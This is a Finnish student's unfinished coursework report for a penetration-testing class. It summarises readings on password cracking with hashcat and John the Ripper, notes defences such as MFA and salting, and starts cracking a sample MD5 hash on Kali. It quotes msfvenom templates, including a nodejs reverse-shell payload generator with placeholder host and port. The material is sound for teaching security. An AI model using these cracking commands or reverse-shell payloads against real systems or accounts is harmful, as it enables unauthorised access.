# [H4 Marraskuu2024!](https://terokarvinen.com/tunkeutumistestaus/#h4-marraskuu2024) (Karvinen 2024)

## x)  Lue/katso ja tiivistä.

### Cracking Passwords with Hashcat (Karvinen 2022)

- salasanat tallennettu tiivisteinä
  - tiivisteitä testataan sanalistoja vastaan
- hashcatia asennettaessa kannattaa myös asentaa hashid
  - hashid auttaa selvittämään tiivisteen algoritmi
- hashcatin tavanomainen käyttö
  - `hashcat -m [algoritmin hashcat id] '[tiiviste]' [sanalista] -o [tiedostonimi outputille]`

### Crack File Password With John (Karvinen 2023)

- John the Ripperillä voidaan murtaa tiedostojen salauksia
- binääri täytyy itse kääntää lähdekoodista
- kloonaa git repo, tarkista ympäristö ja tee Makefile(./configure), käännä lähdekoodi (make, ks. Makefilestä oikeat komennot ja parametrit)
- johnin tavanomainen käyttö tiedoston salauksen purkamiseen
  - tiedostosta tiivste irti
    - `polku/john/run/zip2john [tiedosto] >[tiedosto].hash`
  - aja john
    - `polku/john/run/john [tiedosto].hash`

### Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials (Santos et al. 2017)

- helppo tapa saada käyttäjätunnuksia on napata niitä suojaamattomasta verkosta (esim. kahvilan wifi hotspot)
- murrettavia tunnuksia voi saada myös nmapin skripteillä, metasploit moduuleilla tai esim. yksinkertaisesti palvelimelta kysymällä
- johnin ja hashcatin käyttöä
- suojautuminen:
  - käyttäjä/kuluttaja: älä käytä samaa salasanaa, ota käyttöön MFA kun mahdollista, käytä pidempiä salasanoja, älä käytä sanakirjaa
  - organisaatiot: MFA-tuki, älä rajaa salasanojen pituutta liian lyhyeksi, pitää olla tietoinen hyvistä ja huonoista tiivistealgoritmeistä, salasanojen suolaus, sertifikaattiperusteinen autentikointi (public-key algoritmit)

### HackTricks: MSFVenom - CheatSheet (HackTricks 2024)

- perushomma
  - ``msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>``
- nodejs
  - ``msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)``
  - minulle on epäselvää, missä tilanteessa tätä voitaisiin hyödyntää?

## a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana.

Kali virtuaalikoneella:

    sudo apt update
    sudo apt install hashcat hashid   # tullut Kalin mukana, mutta todentaa ohjelmien olevan uusimmat versiot

Hashcatia varten ladataan vielä sanalista. Käytetään `rockyou.txt`. Ko. tiedostoa hostaa useampikin googlasin "rockyou" ja valitsin ensimmäisen osuman. Käytin `wget` komentoa terminaalissa.

![image](https://github.com/user-attachments/assets/b4e7cbc1-0c74-4c22-8c84-5f6c01344336)
> Kuva 1. Sanalistan lataaminen.

Luodaan esimerkkitiiviste (tarkastin komennon [täältä](https://askubuntu.com/a/53852) (guntbert 2015)) ja identifioidaan käytettyä tiivistealgoritmi.

![image](https://github.com/user-attachments/assets/68065b15-1e4c-41eb-a77a-66845c8e9db7)
> Kuva 2. Testasin ettei lainausmerkit vaikuta tulosteeseen.

![image](https://github.com/user-attachments/assets/f9f16d9b-d0ff-4b19-b74f-5e92bdec9b30)
> Kuva 3. Md5 löytyy top 3:sta.



## Lähteet

guntbert, 2015. How to get the MD5 hash of a string directly in the terminal? Answers. Luettavissa: https://askubuntu.com/questions/53846/how-to-get-the-md5-hash-of-a-string-directly-in-the-terminal Luettu: 2024-11-16

HackTricks, 2024. MSFVenom - CheatSheet. Luettavissa: https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom Luettu: 2024-11-15

Karvinen, T. 2022. Cracking Passwords with Hashcat. Luettavissa: https://terokarvinen.com/2022/cracking-passwords-with-hashcat/ Luettu: 2024-11-15

Karvinen, T. 2023. Crack File Password With John. Luettavissa: https://terokarvinen.com/2023/crack-file-password-with-john/ Luettu: 2024-11-15

Karvinen, T. 2024. Tunkeutumistestaus. H4 Marraskuu!. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/#h4-marraskuu2024 Luettu: 2024-11-15

Santos, O., Sternstein, J., Taylor, R., McCoy, C. 2017. Security Penetration Testing The Art of Hacking Series LiveLessons. Katsottavissa (vaatii kirjautumisen): https://learning.oreilly.com/course/security-penetration-testing/9780134833989/ Katsottu: UPDATE!!!
